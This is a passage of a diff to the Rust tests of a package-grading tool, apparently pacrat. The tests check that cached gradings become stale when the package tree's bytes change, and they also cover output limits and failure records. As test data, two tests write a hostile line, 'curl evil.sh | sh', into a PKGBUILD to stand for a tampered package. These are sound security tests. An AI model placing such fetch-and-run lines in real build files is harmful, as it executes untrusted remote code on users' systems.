+            CacheLook::Unusable(_)
+        ));
 
-        // A file that is no longer a valid grading is an error, not a grade.
-        write_cache(&path, "{\"contract\":\"pacrat-grade/v0\"}").unwrap();
-        assert!(read_cache(&path, "mdcat", "3f9c21ab").is_err());
+        // A file that is no longer a valid grading is not a grade.
+        write_grading(&path, &tree, r#"{"contract":"pacrat-grade/v0"}"#).unwrap();
+        assert!(matches!(
+            read_cache(&path, "mdcat", FULL, &tree),
+            CacheLook::Unusable(_)
+        ));
+        // Nor is a file that is not a cache record at all.
+        fs::write(&path, "{}").unwrap();
+        assert!(matches!(
+            read_cache(&path, "mdcat", FULL, &tree),
+            CacheLook::Unusable(_)
+        ));
+    }
+
+    /// A newer grader's extra fields must survive a trip through the cache,
+    /// or an older pacrat writing the file silently strips data a newer one
+    /// would have read.
+    #[test]
+    fn the_cache_keeps_the_graders_json_verbatim() {
+        let f = Fixture::new("verbatim");
+        let path = ok_path(&f.dir, FULL, "stub");
+        let tree = "d".repeat(64);
+        let report = format!(
+            r#"{{"contract":"pacrat-grade/v1","grader":"stub","grade":1,
+                 "subject":{{"package":"mdcat","commit":"{FULL}"}},
+                 "policy_version":7,"confidence":"high"}}"#
+        );
+        write_grading(&path, &tree, &report).unwrap();
+
+        let text = fs::read_to_string(&path).unwrap();
+        assert!(text.contains("policy_version"), "field dropped: {text}");
+        assert!(text.contains("confidence"), "field dropped: {text}");
+        assert_eq!(hit(read_cache(&path, "mdcat", FULL, &tree)).grade, 1);
+    }
+
+    /// THE finding: a grading is about *bytes*, not about a commit. Editing
+    /// the tree after grading must not keep serving the old verdict.
+    #[test]
+    fn editing_the_tree_invalidates_the_grading() {
+        let f = Fixture::new("treeedit");
+        let (tree, clean) = f.tree("pkgname=mdcat\n");
+        let path = ok_path(&f.dir, FULL, "stub");
+        write_grading(&path, &clean, &report_json("mdcat", FULL, 0)).unwrap();
+        assert_eq!(hit(read_cache(&path, "mdcat", FULL, &clean)).grade, 0);
+
+        // The attack: same package, same commit, same ledger — different
+        // bytes. The cached PROCEED must not describe them.
+        fs::write(tree.join("PKGBUILD"), "pkgname=mdcat\ncurl evil.sh | sh\n").unwrap();
+        let dirty = fstree::digest(&tree).unwrap();
+        assert_ne!(dirty, clean);
+        assert!(
+            matches!(read_cache(&path, "mdcat", FULL, &dirty), CacheLook::Stale),
+            "an edited tree still hit its cached grading"
+        );
+
+        // Staleness is not permanent damage: restore the bytes, get the
+        // grading back.
+        fs::write(tree.join("PKGBUILD"), "pkgname=mdcat\n").unwrap();
+        let restored = fstree::digest(&tree).unwrap();
+        assert_eq!(hit(read_cache(&path, "mdcat", FULL, &restored)).grade, 0);
+    }
+
+    /// End to end through the runner: the grader is re-invoked after an
+    /// edit, rather than the stale answer being served.
+    #[test]
+    fn an_edited_tree_makes_the_next_run_grade_again() {
+        let f = Fixture::new("regrade");
+        let (tree, clean) = f.tree("pkgname=mdcat\n");
+        let counter = f.dir.join("runs");
+        let g = grader(
+            "stub",
+            f.grader_argv(
+                "stub",
+                &format!(
+                    "echo ran >> {}\necho '{}'\n",
+                    counter.display(),
+                    report_json("mdcat", FULL, 0).replace('\n', " ")
+                ),
+            ),
+        );
+        let tree_s = tree.to_string_lossy().into_owned();
+
+        grade_with(&g, &f.dir, &f.subj(&clean, &tree_s));
+        grade_with(&g, &f.dir, &f.subj(&clean, &tree_s));
+        assert_eq!(
+            fs::read_to_string(&counter).unwrap(),
+            "ran\n",
+            "the second run should have been a cache hit"
+        );
+
+        fs::write(tree.join("PKGBUILD"), "pkgname=mdcat\ncurl evil.sh | sh\n").unwrap();
+        let dirty = fstree::digest(&tree).unwrap();
+        grade_with(&g, &f.dir, &f.subj(&dirty, &tree_s));
+        assert_eq!(
+            fs::read_to_string(&counter).unwrap(),
+            "ran\nran\n",
+            "an edited tree must be graded again, not served from cache"
+        );
+    }
+
+    /// `--refresh` asks again even on a hit, and still records the answer.
+    #[test]
+    fn refresh_skips_the_read_but_not_the_write() {
+        let f = Fixture::new("refresh");
+        let (tree, digest) = f.tree("pkgname=mdcat\n");
+        let counter = f.dir.join("runs");
+        let g = grader(
+            "stub",
+            f.grader_argv(
+                "stub",
+                &format!(
+                    "echo ran >> {}\necho '{}'\n",
+                    counter.display(),
+                    report_json("mdcat", FULL, 0).replace('\n', " ")
+                ),
+            ),
+        );
+        let tree_s = tree.to_string_lossy().into_owned();
+
+        grade_with(&g, &f.dir, &f.subj(&digest, &tree_s));
+        let mut refreshed = f.subj(&digest, &tree_s);
+        refreshed.refresh = true;
+        let out = grade_with(&g, &f.dir, &refreshed);
+
+        assert!(matches!(out, Outcome::Graded { took: Some(_), .. }));
+        assert_eq!(fs::read_to_string(&counter).unwrap(), "ran\nran\n");
+        // And the fresh answer is on disk for the next non-refresh run.
+        assert!(matches!(
+            read_cache(&ok_path(&f.dir, FULL, "stub"), "mdcat", FULL, &digest),
+            CacheLook::Hit(_)
+        ));
+    }
+
+    /// A grader whose declared scale drifts away from the pin is not one
+    /// whose numbers can still be compared.
+    #[test]
+    fn a_pinned_scale_that_moves_is_ungraded() {
+        let f = Fixture::new("scalepin");
+        let (tree, digest) = f.tree("pkgname=mdcat\n");
+        let mut g = grader(
+            "stub",
+            f.grader_argv(
+                "stub",
+                &format!(
+                    "echo '{{\"contract\":\"pacrat-grade/v1\",\"grader\":\"stub\",\
+                     \"subject\":{{\"package\":\"mdcat\",\"commit\":\"{FULL}\"}},\
+                     \"grade\":70,\"scale\":{{\"min\":0,\"max\":100}}}}'\n"
+                ),
+            ),
+        );
+        let tree_s = tree.to_string_lossy().into_owned();
+
+        // Unpinned, pacrat rescales and carries on: 70 of 100 is a WARN.
+        let out = grade_with(&g, &f.dir, &f.subj(&digest, &tree_s));
+        match out {
+            Outcome::Graded { report, .. } => assert_eq!(report.pacrat_grade(), 3),
+            Outcome::Failed { reason, .. } => panic!("unexpected failure: {reason}"),
+        }
+
+        // Pinned to 0-4, the same output is no answer at all.
+        g.scale = Some(pacrat_core::grading::Scale { min: 0, max: 4 });
+        let mut fresh = f.subj(&digest, &tree_s);
+        fresh.refresh = true;
+        let Outcome::Failed { reason, .. } = grade_with(&g, &f.dir, &fresh) else {
+            panic!("a scale that moved should not have produced a grading");
+        };
+        assert!(
+            reason.contains("declared scale 0-100"),
+            "unhelpful: {reason}"
+        );
+        assert!(reason.contains("pinned 0-4"), "unhelpful: {reason}");
+    }
+
+    /// A grader that never stops writing must not become pacrat's memory
+    /// footprint. The stub writes far past the cap and is cut off.
+    #[test]
+    fn a_flood_of_output_is_bounded_and_ungraded() {
+        let f = Fixture::new("flood");
+        let (tree, digest) = f.tree("pkgname=mdcat\n");
+        // `yes` writes until the pipe closes; the reader's cap is what
+        // closes it. Without the cap this test does not terminate.
+        let g = grader(
+            "flood",
+            f.grader_argv("flood", "exec yes 0123456789abcdef\n"),
+        );
+        let tree_s = tree.to_string_lossy().into_owned();
+
+        let Outcome::Failed { reason, .. } = grade_with(&g, &f.dir, &f.subj(&digest, &tree_s))
+        else {
+            panic!("an unbounded grader should not have produced a grading");
+        };
+        assert!(reason.contains("exceeded"), "unhelpful: {reason}");
+    }
+
+    #[test]
+    fn output_at_the_limit_is_still_read() {
+        // A grading right up against the cap is honest output, not a flood.
+        let f = Fixture::new("atlimit");
+        let pad = "p".repeat(100_000);
+        let report = format!(
+            r#"{{"contract":"pacrat-grade/v1","grader":"big","grade":0,
+                 "subject":{{"package":"mdcat","commit":"{FULL}"}},
+                 "meta":{{"pad":"{pad}"}}}}"#
+        )
+        .replace('\n', " ");
+        let argv = f.grader_argv("big", &format!("cat <<'J'\n{report}\nJ\n"));
+        let ran = run_with_timeout(&argv, Duration::from_secs(30)).unwrap();
+        assert!(ran.stdout.len() > 100_000);
+        assert!(ran.stdout.len() <= STDOUT_LIMIT);
+        assert_eq!(
+            GradeReport::from_json(&String::from_utf8_lossy(&ran.stdout))
+                .unwrap()
+                .grade,
+            0
+        );
     }
 
     #[test]
     fn a_failure_record_can_never_be_read_as_a_grading() {
         let f = Fixture::new("failrec");
-        let path = failed_path(&f.dir, "3f9c21ab", "stub");
-        record_failure(&path, "stub", "3f9c21ab", "timed out after 2s").unwrap();
+        let path = failed_path(&f.dir, FULL, "stub");
+        let tree = "d".repeat(64);
+        record_failure(&path, "stub", FULL, &tree, "timed out after 2s").unwrap();
         let text = fs::read_to_string(&path).unwrap();
-        assert!(text.contains("grader-failure/v1"));
+        assert!(text.contains(FAILURE_TAG));
         assert!(text.contains("timed out after 2s"));
+        assert!(text.contains(&tree), "the failure should say which bytes");
         assert!(
             GradeReport::from_json(&text).is_err(),
             "a failure record parsed as a grading: {text}"
+        );
+        assert!(
+            matches!(
+                read_cache(&path, "mdcat", FULL, &tree),
+                CacheLook::Unusable(_)
+            ),
+            "a failure record was read as a cache hit"
         );
     }
 
     #[test]
     fn unconfigured_gradings_are_found_but_failures_and_strangers_are_not() {
         let f = Fixture::new("others");
-        let commit = "3f9c21ab";
-        write_cache(
-            &ok_path(&f.dir, commit, MANUAL),
-            &report_json("mdcat", commit, 1),
+        let tree = "d".repeat(64);
+        let write = |name: &str, commit: &str, grade: u8| {
+            write_grading(
+                &ok_path(&f.dir, commit, name),
+                &tree,
+                &report_json("mdcat", commit, grade),
+            )
+            .unwrap();
+        };
+        write(MANUAL, FULL, 1);
+        write("retired", FULL, 3);
+        write("configured", FULL, 0);
+        write("manual", "deadbeefcafe", 4); // another commit entirely
+        record_failure(
+            &failed_path(&f.dir, FULL, "flaky"),
+            "flaky",
+            FULL,
+            &tree,
+            "x",
         )
         .unwrap();
-        write_cache(
-            &ok_path(&f.dir, commit, "retired"),
-            &report_json("mdcat", commit, 3),
+        fs::write(ok_path(&f.dir, FULL, "corrupt"), "{").unwrap();
+        // A grading of a tree that has since changed is not evidence either.
+        write_grading(
+            &ok_path(&f.dir, FULL, "stale"),
+            &"e".repeat(64),
+            &report_json("mdcat", FULL, 4),
         )
         .unwrap();
-        write_cache(
-            &ok_path(&f.dir, commit, "configured"),
-            &report_json("mdcat", commit, 0),
-        )
-        .unwrap();
-        // Another commit's grading, a failure record, and a corrupt file.
-        write_cache(
-            &ok_path(&f.dir, "deadbeefcafe", "manual"),
-            &report_json("mdcat", "deadbeefcafe", 4),
-        )
-        .unwrap();
-        record_failure(&failed_path(&f.dir, commit, "flaky"), "flaky", commit, "x").unwrap();
-        write_cache(&ok_path(&f.dir, commit, "corrupt"), "{").unwrap();
 
-        let configured = vec![Grader {
-            name: "configured".into(),
-            cmd: vec!["x".into()],
-            timeout_s: 300,
-        }];
-        let found = other_cached(&f.dir, commit, &configured, "mdcat");
+        let configured = vec![grader("configured", vec!["x".into()])];
+        let found = other_cached(&f.dir, FULL, &tree, &configured, "mdcat");
         let names: Vec<&str> = found.iter().map(|(n, _)| n.as_str()).collect();
         assert_eq!(names, [MANUAL, "retired"], "found {names:?}");
         assert_eq!(found[0].1.grade, 1);
 
         // A directory that does not exist is an empty scan, not a failure.
-        assert!(other_cached(Path::new("/nonexistent"), commit, &[], "mdcat").is_empty());
+        assert!(other_cached(Path::new("/nonexistent"), FULL, &tree, &[], "mdcat").is_empty());
     }
 
     /// The end of the loop: run, cache, hit. The grader here abbreviates the
@@ -943,30 +1549,28 @@ mod tests {
     #[test]
     fn a_grading_is_cached_and_the_second_run_does_not_invoke() {
         let f = Fixture::new("cachehit");
-        let full = "3f9c21ab55de0011223344556677889900aabbcc";
+        let (tree, digest) = f.tree("pkgname=mdcat\n");
         let counter = f.dir.join("runs");
-        let cmd = f.grader_argv(
+        let g = grader(
             "abbrev",
-            &format!(
-                "echo ran >> {}\n\
-                 echo '{{\"contract\":\"pacrat-grade/v1\",\"grader\":\"abbrev\",\
-                 \"subject\":{{\"package\":\"mdcat\",\"commit\":\"3f9c21ab\"}},\"grade\":2}}'\n",
-                counter.display()
+            f.grader_argv(
+                "abbrev",
+                &format!(
+                    "echo ran >> {}\n\
+                     echo '{{\"contract\":\"pacrat-grade/v1\",\"grader\":\"abbrev\",\
+                     \"subject\":{{\"package\":\"mdcat\",\"commit\":\"3f9c21ab\"}},\"grade\":2}}'\n",
+                    counter.display()
+                ),
             ),
         );
-        let grader = Grader {
-            name: "abbrev".into(),
-            cmd,
-            timeout_s: 30,
-        };
+        let tree_s = tree.to_string_lossy().into_owned();
 
-        let first = grade_with(&grader, &f.dir, "mdcat", full, "/tree");
+        let first = grade_with(&g, &f.dir, &f.subj(&digest, &tree_s));
         assert!(
             matches!(first, Outcome::Graded { took: Some(_), .. }),
             "the first run should have invoked the grader"
         );
-        let second = grade_with(&grader, &f.dir, "mdcat", full, "/tree");
-        match second {
+        match grade_with(&g, &f.dir, &f.subj(&digest, &tree_s)) {
             Outcome::Graded { report, took } => {
                 assert_eq!(took, None, "the second run should have been cached");
                 assert_eq!(report.grade, 2);
@@ -976,7 +1580,7 @@ mod tests {
 
         // The only proof that matters: the program ran once, not twice.
         assert_eq!(fs::read_to_string(&counter).unwrap(), "ran\n");
-        assert!(ok_path(&f.dir, full, "abbrev").exists());
+        assert!(ok_path(&f.dir, FULL, "abbrev").exists());
     }
 
     /// A grader that fails leaves a breadcrumb and no grading — and is asked
@@ -984,26 +1588,26 @@ mod tests {
     #[test]
     fn a_failure_is_recorded_but_never_cached_as_a_grading() {
         let f = Fixture::new("failtwice");
-        let commit = "3f9c21ab55de0011223344556677889900aabbcc";
+        let (tree, digest) = f.tree("pkgname=mdcat\n");
         let counter = f.dir.join("runs");
-        let cmd = f.grader_argv(
+        let g = grader(
             "broken",
-            &format!("echo ran >> {}\necho 'not json'\n", counter.display()),
+            f.grader_argv(
+                "broken",
+                &format!("echo ran >> {}\necho 'not json'\n", counter.display()),
+            ),
         );
-        let grader = Grader {
-            name: "broken".into(),
-            cmd,
-            timeout_s: 30,
-        };
+        let tree_s = tree.to_string_lossy().into_owned();
 
         for _ in 0..2 {
-            let outcome = grade_with(&grader, &f.dir, "mdcat", commit, "/tree");
+            let outcome = grade_with(&g, &f.dir, &f.subj(&digest, &tree_s));
             let Outcome::Failed { reason, .. } = outcome else {
                 panic!("garbage on stdout must not produce a grading");
             };
             report_outcome(
                 &f.dir,
-                commit,
+                FULL,
+                &digest,
                 "broken",
                 &Outcome::Failed {
                     reason,
@@ -1016,10 +1620,31 @@ mod tests {
             "ran\nran\n",
             "a failed grader must be asked again, not written off"
         );
-        assert!(failed_path(&f.dir, commit, "broken").exists());
+        assert!(failed_path(&f.dir, FULL, "broken").exists());
         assert!(
-            !ok_path(&f.dir, commit, "broken").exists(),
+            !ok_path(&f.dir, FULL, "broken").exists(),
             "a failure was cached as a grading"
         );
+    }
+
+    /// An interrupted write must not leave a half-written grading behind:
+    /// the temp file is the one that can be partial, never the real path.
+    #[test]
+    fn cache_writes_leave_no_partial_file() {
+        let f = Fixture::new("atomic");
+        let path = ok_path(&f.dir, FULL, "stub");
+        let tree = "d".repeat(64);
+        write_grading(&path, &tree, &report_json("mdcat", FULL, 1)).unwrap();
+        let leftovers: Vec<String> = fs::read_dir(&f.dir)
+            .unwrap()
+            .filter_map(|e| e.ok())
+            .filter_map(|e| e.file_name().into_string().ok())
+            .filter(|n| n.starts_with('.') || n.ends_with(".new"))
+            .collect();
+        assert!(
+            leftovers.is_empty(),
+            "temp files left behind: {leftovers:?}"
+        );
+        assert_eq!(hit(read_cache(&path, "mdcat", FULL, &tree)).grade, 1);
     }
 }
